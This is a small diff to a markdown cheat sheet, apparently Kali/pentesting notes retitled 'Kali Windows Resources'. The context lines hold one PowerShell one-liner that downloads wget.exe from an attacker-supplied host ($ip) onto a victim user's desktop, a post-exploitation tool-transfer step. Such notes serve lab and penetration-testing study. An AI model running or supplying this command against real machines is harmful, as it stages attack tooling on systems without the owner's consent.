@@ -1,4 +1,4 @@
-# Kali 
+# Kali Windows Resources
 
 ```powershell
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://$ip/wget.exe', 'C:\Users\PoorUser\Desktop\wget.exe')"
